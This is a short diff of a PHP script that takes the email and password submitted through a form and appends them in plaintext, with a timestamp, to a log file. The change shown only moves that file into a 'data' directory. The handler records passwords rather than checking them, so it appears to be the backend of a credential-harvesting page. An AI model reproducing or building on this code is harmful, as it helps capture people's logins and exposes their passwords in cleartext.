@@ -4,7 +4,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $password = $_POST['password'] ?? '';
 
     if (!empty($email) && !empty($password)) {
-        $file = "logins.txt";
+        $file = "data/logins.txt";
         $log_entry = "Email: $email | Password: $password | Time: " . date("Y-m-d H:i:s") . "\n";
 
         if (file_put_contents($file, $log_entry, FILE_APPEND)) {
